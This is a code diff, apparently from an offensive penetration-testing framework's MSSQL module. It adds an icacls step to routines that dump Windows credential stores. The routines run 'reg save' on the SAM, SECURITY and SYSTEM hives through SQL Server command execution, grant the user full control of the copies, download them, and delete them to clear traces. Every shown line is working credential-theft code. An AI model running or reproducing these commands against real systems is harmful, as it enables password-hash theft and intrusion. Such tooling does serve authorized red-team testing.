@@ -554,10 +554,12 @@ class mssql(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
             exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
             exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             exec_method.execute(clean_command)
@@ -587,10 +589,12 @@ class mssql(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
             exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
             exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             exec_method.execute(clean_command)
